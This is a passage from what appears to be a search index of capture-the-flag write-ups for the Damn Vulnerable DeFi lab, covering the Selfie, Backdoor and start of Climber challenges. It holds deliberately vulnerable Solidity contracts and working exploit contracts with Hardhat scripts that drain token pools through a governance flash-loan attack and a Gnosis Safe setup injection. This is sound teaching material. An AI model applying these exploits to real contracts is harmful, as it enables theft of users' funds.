uint256 amount = token.balanceOf(address(this));\n        token.transfer(receiver, amount);\n\n        emit FundsDrained(receiver, amount);\n    }\n}\n</code></pre> <p>SimpleGovernance.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../DamnValuableTokenSnapshot.sol\";\nimport \"./ISimpleGovernance.sol\"\n;\n/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SimpleGovernance is ISimpleGovernance {\n\n    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;\n    DamnValuableTokenSnapshot private _governanceToken;\n    uint256 private _actionCounter;\n    mapping(uint256 =&gt; GovernanceAction) private _actions;\n\n    constructor(address governanceToken) {\n        _governanceToken = DamnValuableTokenSnapshot(governanceToken);\n        _actionCounter = 1;\n    }\n\n    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {\n        if (!_hasEnoughVotes(msg.sender))\n            revert NotEnoughVotes(msg.sender);\n\n        if (target == address(this))\n            revert InvalidTarget();\n\n        if (data.length &gt; 0 &amp;&amp; target.code.length == 0)\n            revert TargetMustHaveCode();\n\n        actionId = _actionCounter;\n\n        _actions[actionId] = GovernanceAction({\n            target: target,\n            value: value,\n            proposedAt: uint64(block.timestamp),\n            executedAt: 0,\n            data: data\n        });\n\n        unchecked { _actionCounter++; }\n\n        emit ActionQueued(actionId, msg.sender);\n    }\n\n    function executeAction(uint256 actionId) external payable returns (bytes memory) {\n        if(!_canBeExecuted(actionId))\n            revert CannotExecute(actionId);\n\n        GovernanceAction storage actionToExecute = _actions[actionId];\n        actionToExecute.executedAt = uint64(block.timestamp);\n\n        emit ActionExecuted(actionId, msg.sender);\n\n        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);\n        if (!success) {\n            if (returndata.length &gt; 0) {\n                assembly {\n                    revert(add(0x20, returndata), mload(returndata))\n                }\n            } else {\n                revert ActionFailed(actionId);\n            }\n        }\n\n        return returndata;\n    }\n\n    function getActionDelay() external pure returns (uint256) {\n        return ACTION_DELAY_IN_SECONDS;\n    }\n\n    function getGovernanceToken() external view returns (address) {\n        return address(_governanceToken);\n    }\n\n    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {\n        return _actions[actionId];\n    }\n\n    function getActionCounter() external view returns (uint256) {\n        return _actionCounter;\n    }\n\n    /**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */\n    function _canBeExecuted(uint256 actionId) private view returns (bool) {\n        GovernanceAction memory actionToExecute = _actions[actionId];\n\n        if (actionToExecute.proposedAt == 0) // early exit\n            return false;\n\n        uint64 timeDelta;\n        unchecked {\n            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;\n        }\n\n        return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS;\n    }\n\n    function _hasEnoughVotes(address who) private view returns (bool) {\n        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);\n        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;\n        return balance &gt; halfTotalSupply;\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/06.%20Selfie/#goal","title":"Goal","text":"<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/06.%20Selfie/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The vulnerable part of the code is located in the SelfiePool contract, inside the emergencyExit, the problem is that we can bypass the onlyGovernance modifier and transfer all the DVT tokens from the SelfiePool to our address.</p> <p>To explout the selfie pool we need to:</p> <ol> <li>create Attacker contract, this contract will be borrowing the flash loan from the SelfiePool, therefore it needs to implement the onFlashLoan() function from IERC3156FlashBorrower. We need to have instances of of the SimpleGovernance, SelfiePool and the DamnValuableTokenSnapshot contracts</li> <li> <p>implement onFlashLoan() function, inside this function we will:  <ul> <li>call the snapshot function from the DamnValuableTokenSnapshot token contract, we need this in order to snapshot that the borrowed tokens are in posession of the Attacker contract now</li> <li>call the queueAction() function from SimpleGovernance pool, and send abi.encodeWithSignature(\"emergencyExit(address)\", address(this)) as a argument for the data parameter, this way we will call the emergencyExit() function from the SimpleGovernance contract</li> <li>approve the DamnValuableTokenSnapshot token contract to use the borrowed tokens, this is needed in order to repay the loan</li> </ul></p> </li> <li> <p>create executeFlashLoan() external function, inside this function we will call flashLoan function from the SelfiePool contract</p> </li> <li>create executeAction() external function, inside this function we will call executeAction() function from the SimpleGovernance contract, and after that it will transfer the DVT tokens from the Attacker contract to our EOA</li> <li>create instance from the Attacker contract</li> <li>call executeFlashLoan from the Attacker contract</li> <li>increase evm time for 2 days, await ethers.provider.send(\"evm_increaseTime\", [2 * 24 * 60 * 60]); // 2 days</li> <li>call executeAction from the attacker contract</li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/06.%20Selfie/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"./SelfiePool.sol\";\nimport \"./ISimpleGovernance.sol\";\nimport \"../DamnValuableTokenSnapshot.sol\";\n\ncontract SelfieAttacker is IERC3156FlashBorrower {\n    address private immutable governance;\n    SelfiePool private immutable pool;\n    DamnValuableTokenSnapshot private governanceToken;\n\n    constructor(address _governance, SelfiePool _pool, address _token) {\n        governance = _governance;\n        pool = SelfiePool(_pool);\n        governanceToken = DamnValuableTokenSnapshot(_token);\n    }\n\n    function onFlashLoan(\n        address,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata\n    ) external override returns (bytes32) {\n        uint snapshotId = governanceToken.snapshot();\n\n        ISimpleGovernance(governance).queueAction(\n            address(pool),\n            0,\n            abi.encodeWithSignature(\"emergencyExit(address)\", address(this))\n        );\n\n        governanceToken.approve(address(pool), amount);\n\n\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function executeFlashLoan() external {\n        pool.flashLoan(\n            IERC3156FlashBorrower(address(this)),\n            address(governanceToken),\n            governanceToken.balanceOf(address(pool)),\n            \"\"\n        );\n    }\n\n    function executeAction() external {\n        ISimpleGovernance(governance).executeAction{value: 0}(1);\n        governanceToken.transfer(\n            msg.sender,\n            governanceToken.balanceOf(address(this))\n        );\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/06.%20Selfie/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\nconst { time } = require(\"@nomicfoundation/hardhat-network-helpers\");\n\ndescribe('[Challenge] Selfie', function () {\nlet deployer, player;\nlet token, governance, pool;\n\nconst TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;\nconst TOKENS_IN_POOL = 1500000n * 10n ** 18n;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n[deployer, player] = await ethers.getSigners();\n\n// Deploy Damn Valuable Token Snapshot\ntoken = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);\n\n// Deploy governance contract\ngovernance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);\nexpect(await governance.getActionCounter()).to.eq(1);\n\n// Deploy the pool\npool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(\ntoken.address,\ngovernance.address    );\nexpect(await pool.token()).to.eq(token.address);\nexpect(await pool.governance()).to.eq(governance.address);\n\n// Fund the pool\nawait token.transfer(pool.address, TOKENS_IN_POOL);\nawait token.snapshot();\nexpect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);\nexpect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);\nexpect(await pool.flashFee(token.address, 0)).to.eq(0);\n\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nconst attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(\ngovernance.address,\npool.address,\ntoken.address\n);\n\nconst flashLoanTx = await attacker.connect(player).executeFlashLoan();\nawait flashLoanTx.wait();\n\nawait ethers.provider.send(\"evm_increaseTime\", [2 * 24 * 60 * 60]); // 2 days\n\nconst executeActionTx = await attacker.connect(player).executeAction();\nawait executeActionTx.wait();\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n\n// Player has taken all tokens from the pool\nexpect(\nawait token.balanceOf(player.address)\n).to.be.equal(TOKENS_IN_POOL);  expect(\nawait token.balanceOf(pool.address)\n).to.be.equal(0);\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/11.%20Backdoor/","title":"Backdoor","text":"<p>WalletRegistry.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"solady/src/auth/Ownable.sol\";\nimport \"solady/src/utils/SafeTransferLib.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\";\n\n/**\n * @title WalletRegistry\n * @notice A registry for Gnosis Safe wallets.\n *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.\n * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract WalletRegistry is IProxyCreationCallback, Ownable {\n    uint256 private constant EXPECTED_OWNERS_COUNT = 1;\n    uint256 private constant EXPECTED_THRESHOLD = 1;\n    uint256 private constant PAYMENT_AMOUNT = 10 ether;\n\n    address public immutable masterCopy;\n    address public immutable walletFactory;\n    IERC20 public immutable token;\n\n    mapping(address =&gt; bool) public beneficiaries;\n\n    // owner =&gt; wallet\n    mapping(address =&gt; address) public wallets;\n\n    error NotEnoughFunds();\n    error CallerNotFactory();\n    error FakeMasterCopy();\n    error InvalidInitialization();\n    error InvalidThreshold(uint256 threshold);\n    error InvalidOwnersCount(uint256 count);\n    error OwnerIsNotABeneficiary();\n    error InvalidFallbackManager(address fallbackManager);\n\n    constructor(\n        address masterCopyAddress,\n        address walletFactoryAddress,\n        address tokenAddress,\n        address[] memory initialBeneficiaries\n    ) {\n        _initializeOwner(msg.sender);\n\n        masterCopy = masterCopyAddress;\n        walletFactory = walletFactoryAddress;\n        token = IERC20(tokenAddress);\n\n        for (uint256 i = 0; i &lt; initialBeneficiaries.length;) {\n            unchecked {\n                beneficiaries[initialBeneficiaries[i]] = true;\n                ++i;\n            }\n        }\n    }\n\n    function addBeneficiary(address beneficiary) external onlyOwner {\n        beneficiaries[beneficiary] = true;\n    }\n\n    /**\n     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback\n     *          setting the registry's address as the callback.\n     */\n    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)\n        external\n        override\n    {\n        if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT) { // fail early\n            revert NotEnoughFunds();\n        }\n\n        address payable walletAddress = payable(proxy);\n\n        // Ensure correct factory and master copy\n        if (msg.sender != walletFactory) {\n            revert CallerNotFactory();\n        }\n\n        if (singleton != masterCopy) {\n            revert FakeMasterCopy();\n        }\n\n        // Ensure initial calldata was a call to `GnosisSafe::setup`\n        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {\n            revert InvalidInitialization();\n        }\n\n        // Ensure wallet initialization is the expected\n        uint256 threshold = GnosisSafe(walletAddress).getThreshold();\n        if (threshold != EXPECTED_THRESHOLD) {\n            revert InvalidThreshold(threshold);\n        }\n\n        address[] memory owners = GnosisSafe(walletAddress).getOwners();\n        if (owners.length != EXPECTED_OWNERS_COUNT) {\n            revert InvalidOwnersCount(owners.length);\n        }\n\n        // Ensure the owner is a registered beneficiary\n        address walletOwner;\n        unchecked {\n            walletOwner = owners[0];\n        }\n        if (!beneficiaries[walletOwner]) {\n            revert OwnerIsNotABeneficiary();\n        }\n\n        address fallbackManager = _getFallbackManager(walletAddress);\n        if (fallbackManager != address(0))\n            revert InvalidFallbackManager(fallbackManager);\n\n        // Remove owner as beneficiary\n        beneficiaries[walletOwner] = false;\n\n        // Register the wallet under the owner's address\n        wallets[walletOwner] = walletAddress;\n\n        // Pay tokens to the newly created wallet\n        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);\n    }\n\n    function _getFallbackManager(address payable wallet) private view returns (address) {\n        return abi.decode(\n            GnosisSafe(wallet).getStorageAt(\n                uint256(keccak256(\"fallback_manager.handler.address\")),\n                0x20\n            ),\n            (address)\n        );\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/11.%20Backdoor/#goal","title":"Goal","text":"<p>Our goal is to take all funds (DVT) from the registry (<code>WalletRegistry</code> contract). In a single transaction.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/11.%20Backdoor/#exploit","title":"Exploit","text":"<p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p> <p>In order to be able to exploit the <code>WalletRegistry</code> we must be familiar with Gnosis Safe wallets, and how they function.</p> <p>Gnosis Safe is a multisignature wallet, which is implemented thorugh a smart contract that is deployed on the blockchain. It's most commonly used to require more owners of a particular Gnosis Safe to approve that a specific transaction can be submitted to the blockchain.</p> <p>Additionaly, Gnosis Safe allows you to add modules to it, extending it's functionalities. Behind the scenes, Gnosis Safe is a specific type of proxy contract, where we have a Gnosis Safe Proxy Factory Contract, and the job of this factory contract is to deploy new Gnosis Safe wallets.</p> <p>By following the proxy upgradability it allows all created Gnosis Safes to use one logic contract (<code>GnosisSafe</code>), while delegating calls to it. In particular every single Gnosis Safe is actually a proxy, that will <code>delegatecall</code> to the implementation which is the <code>GnosisSafe</code> contract.</p> <p>The way it works is, we have the factory deployed (<code>GnosisSafeProxyFactory</code>), and a single veriosn of the wallet (<code>GnosisSafe</code>), this is what's known as the Singleton Pattern. Later on, the factory will deploy a proxy and any call to that proxy will be delegated to <code>GnosisSafe</code>.</p> <p>Let's get back to our CTF.</p> <p>We are given the <code>WalletRegistry</code> contract, inside this contract we have the <code>beneficiaries</code> mapping pre-populated. Whenever an account inside <code>beneficiaries</code> decides to create a Gnosis Safe, this safe will receive 10 DVT tokens.</p> <p>The way <code>WalletRegistry</code> keeps track whether a benificary has created a Gnosis Safe is with the help of <code>proxyCreated</code> function.</p> <p>Whenever a Gnosis Safe is created via <code>GnosisSafeProxyFactory::createProxyWithCallback</code> function, <code>proxyCreated</code> will be triggered, and inside this function multiple checks will be performed and if every requirement is fullfilled, 10 DVT tokens will be send to the beneficiary wallet.</p> <p>However, there is a critical assumption in these checks. The assumption is that the owner of the safe is the same person that created the safe. This is not a safe assumption!</p> <p>First, let's explore what exactly is being called when these safes are deployed.</p> <p>The <code>GnosisSafeProxyFactory::createProxyWithCallback</code> function allows us to pass arbitrary code as an initializer for the new safe. But as required in the checks noted above, this initializer must be a call to <code>GnosisSafe::setup</code>.</p> <p>Since we can pass anything we want to this <code>setup</code> function, there's an opportunity for an exploit.</p> <p>The <code>to</code> and <code>data</code> parameters are used to execute arbitrary code as the safe, as soon as the safe is created. We can pass an ERC-20 <code>approve</code> call as the data parameter to grant our attack smart contract address full access to the safe's DVT tokens!</p> <p>In order to fit the attack into one transaction, we'll need to instantiate a single-use callback smart contract to pass as the <code>to</code> parameter during the attack. Inside the callback contract should be a wrapper function that calls the ERC-20 <code>approve</code> function.</p> <p>In this CTF by extending the Gnosis Safe with additional module (<code>setupModules</code> function from <code>ModuleManager</code> contract) we can add our <code>BackdoorAttacker</code> contract as module.</p> <p>In order for this attack to be prevented, inside the <code>WalletRegistry</code> we must check that the creator (initiator) of the Gnosis Safe is indeed one of the beneficiaries that are previously set.</p> <p>To exploit the contract we need to:</p> <ol> <li>create <code>DVTStealerModule</code> contract, inside this contract we will create a function that will approve the <code>BackdoorAttacker</code> contract to transfer all the DVT tokens from the GnosisSafe to our account (this is the single-use callback contract)</li> <li> <p>create <code>BackdoorAttacker</code> contract, and pass the following parameters to the <code>constructor</code>:  <ul> <li>address of the GnosisSafeProxyFactory</li> <li>address of the GnosisSafe</li> <li>address of the WalletRegistry</li> <li>addresses of the beneficiaries</li> <li>DVT token address</li> </ul></p> </li> <li> <p>inside the constructor we will:  <ul> <li>instantiate new DVTStealerModule contract</li> <li>use a for loop to go through the list of all beneficiaries, and in every iteration we will: prepare the data for the initializer parameter that we need to send to GnosisSafeProxyFactory::createProxyWithCallback; create new GnosisSafe proxy (behind the scenes this proxy will delegatecall to the DVTStealerModule approving the BackdoorAttacker contract to spend the DVT tokens on its behalf); transfer the DVT tokens from the GnosisSafe proxy to ourselves</li> </ul> </p> </li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/11.%20Backdoor/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract DVTStealerModule {\n    function stealDVTTokens(address approvalAddress, address token, uint256 amount) public {\n        IERC20(token).approve(approvalAddress, amount);\n    }\n}\n\ncontract BackdoorAttacker {\n\n    constructor(address walletFactory, address singleton, address walletRegistry, address[] memory beneficiaries, address dvt) {\n        DVTStealerModule tokenStealer = new DVTStealerModule();\n\n        for(uint256 i = 0; i &lt; beneficiaries.length; i++) {\n            address[] memory owners = new address[](1);\n            owners[0] = beneficiaries[i];\n\n            bytes memory initializer = abi.encodeWithSignature(\n                \"setup(address[],uint256,address,bytes,address,address,uint256,address)\",\n                owners,\n                1,\n                address(tokenStealer),\n                abi.encodeWithSignature(\"stealDVTTokens(address,address,uint256)\", address(this), dvt, 10 ether),\n                address(0),\n                address(0),\n                0,\n                address(0)\n            );\n\n            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(\n                singleton,\n                initializer,\n                i,\n                IProxyCreationCallback(walletRegistry)\n            );\n\n            IERC20(dvt).transferFrom(\n                address(proxy),\n                msg.sender,\n                10 ether\n            );\n        }\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/11.%20Backdoor/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\n\ndescribe('[Challenge] Backdoor', function () {\nlet deployer, users, player;\nlet masterCopy, walletFactory, token, walletRegistry;\n\nconst AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n[deployer, alice, bob, charlie, david, player] = await ethers.getSigners();\nusers = [alice.address, bob.address, charlie.address, david.address]\n\n// Deploy Gnosis Safe master copy and factory contracts\nmasterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();\nwalletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();\ntoken = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();\n\n// Deploy the registry\nwalletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(\nmasterCopy.address,\nwalletFactory.address,\ntoken.address,\nusers\n);\nexpect(await walletRegistry.owner()).to.eq(deployer.address);\n\nfor (let i = 0; i &lt; users.length; i++) {\n// Users are registered as beneficiaries\nexpect(\nawait walletRegistry.beneficiaries(users[i])\n).to.be.true;\n\n// User cannot add beneficiaries\nawait expect(\nwalletRegistry.connect(\nawait ethers.getSigner(users[i])\n).addBeneficiary(users[i])\n).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');\n}\n\n// Transfer tokens to be distributed to the registry\nawait token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nbackdoorAttacker = await (await ethers.getContractFactory('BackdoorAttacker', player)).deploy(\nwalletFactory.address,\nmasterCopy.address,\nwalletRegistry.address,\nusers,\ntoken.address\n);\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n\n// Player must have used a single transaction\nexpect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);\n\nfor (let i = 0; i &lt; users.length; i++) {\nlet wallet = await walletRegistry.wallets(users[i]);\n\n// User must have registered a wallet\nexpect(wallet).to.not.eq(\nethers.constants.AddressZero,\n'User did not register a wallet'\n);\n\n// User is no longer registered as a beneficiary\nexpect(\nawait walletRegistry.beneficiaries(users[i])\n).to.be.false;\n}\n\n// Player must own all tokens\nexpect(\nawait token.balanceOf(player.address)\n).to.eq(AMOUNT_TOKENS_DISTRIBUTED);\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/12.%20Climber/","title":"Climber","text":"<p>ClimberConstants.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/* ########################## */\n/* ### TIMELOCK CONSTANTS ### */\n/* ########################## */\n\n// keccak256(\"ADMIN_ROLE\");\nbytes32 constant ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;\n\n// keccak256(\"PROPOSER_ROLE\");\nbytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;\n\nuint256 constant MAX_TARGETS = 256;\nuint256 constant MIN_TARGETS = 0;\nuint256 constant MAX_DELAY = 14 days;\n\n/* ####################### */\n/* ### VAULT CONSTANTS ### */\n/* ####################### */\n\nuint256 constant WITHDRAWAL_LIMIT = 1 ether;\nuint256 constant WAITING_PERIOD = 15 days;\n</code></pre> <p>ClimberErrors.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nerror CallerNotTimelock();\nerror NewDelayAboveMax();\nerror NotReadyForExecution(bytes32 operationId);\nerror InvalidTargetsCount();\nerror InvalidDataElementsCount();\nerror InvalidValuesCount();\nerror OperationAlreadyKnown(bytes32 operationId);\nerror CallerNotSweeper();\nerror InvalidWithdrawalAmount();\nerror InvalidWithdrawalTime();\n</code></pre> <p>ClimberTimelockBase.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\n\n/**\n * @title ClimberTimelockBase\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\nabstract contract ClimberTimelockBase is AccessControl {\n    // Possible states for an operation in this timelock contract\n    enum OperationState {\n        Unknown,\n        Scheduled,\n        ReadyForExecution,\n        Executed\n    }\n\n    // Operation data tracked in this contract\n    struct Operation {\n        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution\n        bool known; // whether the operation is registered in the timelock\n        bool executed; // whether the operation has been executed\n    }\n\n    // Operations are tracked by their bytes32 identifier\n    mapping(bytes32 =&gt; Operation) public operations;\n\n    uint64 public delay;\n\n    function getOperationState(bytes32 id) public view returns (OperationState state) {\n        Operation memory op = operations[id];\n\n        if (op.known) {\n            if (op.executed) {\n                state = OperationState.Executed;\n            } else if (block.timestamp &lt; op.readyAtTimestamp) {\n                state = OperationState.Scheduled;\n            } else {\n                state = OperationState.ReadyForExecution;\n            }\n        } else {\n            state = OperationState.Unknown;\n        }\n    }\n\n    function getOperationId(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encode(targets, values, dataElements, salt));\n    }\n\n    receive() external payable {}\n}\n</code></pre> <p>ClimberTimelock.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"./ClimberTimelockBase.sol\";\nimport {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from \"./ClimberConstants.sol\";\nimport {\n    InvalidTargetsCount,\n    InvalidDataElementsCount,\n    InvalidValuesCount,\n    OperationAlreadyKnown,\n    NotReadyForExecution,\n    CallerNotTimelock,\n    NewDelayAboveMax\n} from \"./ClimberErrors.sol\";\n\n/**\n * @title ClimberTimelock\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberTimelock is ClimberTimelockBase {\n    using Address for address;\n\n    /**\n     * @notice Initial setup for roles and timelock delay.\n     * @param admin address of the account that will hold the ADMIN_ROLE role\n     * @param proposer address of the account that will hold the PROPOSER_ROLE role\n     */\n    constructor(address admin, address proposer) {\n        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);\n        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);\n        _setupRole(ADMIN_ROLE, admin);\n        _setupRole(ADMIN_ROLE, address(this)); // self administration\n        _setupRole(PROPOSER_ROLE, proposer);\n\n        delay = 1 hours;\n    }\n\n    function schedule(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) external onlyRole(PROPOSER_ROLE) {\n        if (targets.length == MIN_TARGETS || targets.length &gt;= MAX_TARGETS) {\n            revert InvalidTargetsCount();\n        }\n\n        if (targets.length != values.length) {\n            revert InvalidValuesCount();\n        }\n\n        if (targets.length != dataElements.length) {\n            revert InvalidDataElementsCount();\n        }\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n\n        if (getOperationState(id) != OperationState.Unknown) {\n            revert OperationAlreadyKnown(id);\n        }\n\n        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;\n        operations[id].known = true;\n    }\n\n    /**\n     * Anyone can execute what's been scheduled via `schedule`\n     */\n    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)\n        external\n        payable\n    {\n        if (targets.length &lt;= MIN_TARGETS) {\n            revert InvalidTargetsCount();\n        }\n\n        if (targets.length != values.length) {\n            revert InvalidValuesCount();\n        }\n\n        if (targets.length != dataElements.length) {\n            revert InvalidDataElementsCount();\n        }\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n\n        for (uint8 i = 0; i &lt; targets.length;) {\n            targets[i].functionCallWithValue(dataElements[i], values[i]);\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (getOperationState(id) != OperationState.ReadyForExecution) {\n            revert NotReadyForExecution(id);\n        }\n\n        operations[id].executed = true;\n    }\n\n    function updateDelay(uint64 newDelay) external {\n        if (msg.sender != address(this)) {\n            revert CallerNotTimelock();\n        }\n\n        if (newDelay &gt; MAX_DELAY) {\n            revert NewDelayAboveMax();\n        }\n\n        delay = newDelay;\n    }\n}\n</code></pre> <p>ClimberVault.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"solady/src/utils/SafeTransferLib.sol\";\n\nimport \"./ClimberTimelock.sol\";\nimport {WITHDRAWAL_LIMIT, WAITING_PERIOD} from \"./ClimberConstants.sol\";\nimport {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from \"./ClimberErrors.sol\";\n\n/**\n * @title ClimberVault\n * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n\n    modifier onlySweeper() {\n        if (msg.sender != _sweeper) {\n            revert CallerNotSweeper();\n        }\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address admin, address proposer, address sweeper) external initializer {\n        // Initialize inheritance chain\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n\n        // Deploy timelock and transfer ownership to it\n        transferOwnership(address(new ClimberTimelock(admin, proposer)));\n\n        _setSweeper(sweeper);\n        _updateLastWithdrawalTimestamp(block.timestamp);\n    }\n\n    // Allows the owner to send a limited amount of tokens to a recipient every now and then\n    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {\n        if (amount &gt; WITHDRAWAL_LIMIT) {\n            revert InvalidWithdrawalAmount();\n        }\n\n        if (block.timestamp &lt;= _lastWithdrawalTimestamp + WAITING_PERIOD) {\n            revert InvalidWithdrawalTime();\n        }\n\n        _updateLastWithdrawalTimestamp(block.timestamp);\n\n        SafeTransferLib.safeTransfer(token, recipient, amount);\n    }\n\n    // Allows trusted sweeper account to retrieve any tokens\n    function sweepFunds(address token) external onlySweeper {\n        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));\n    }\n\n    function getSweeper() external view returns (address) {\n        return 